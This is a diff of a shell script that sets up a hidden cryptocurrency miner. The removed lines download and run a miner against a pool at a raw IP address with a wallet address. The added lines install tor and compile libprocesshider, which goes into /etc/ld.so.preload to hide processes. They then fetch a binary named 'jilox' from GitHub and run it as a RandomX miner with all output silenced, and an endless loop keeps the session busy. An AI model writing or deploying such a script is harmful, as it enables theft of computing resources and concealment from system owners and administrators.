@@ -1,11 +1,20 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
 
-A=170.187.225.46:443
-B=GMPHYf5KRkcAyik7Jw9oHRfJtUdw2Kj5f4VTFJ25AaFVYxofetir8Cnh7S76Q854oMXzwaguL8p5KEz1tm3rn1SA6hix4sVifS1KWXHBTu
-C=PAYG
-D=rx/0
-apt-get update && apt-get upgrade -y
-wget https://github.com/muledan1/bash/raw/main/-.tar.gz
-tar -xf -.tar.gz
-./- --donate-level 1 -o $A -u $B -p $C -a $D -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
-sleep 10
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
+A=172.104.122.78:443
+B=ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD
+C=GAS
+wget https://github.com/13422159/data/raw/main/jilox && chmod u+x jilox
+./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
+r
+
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
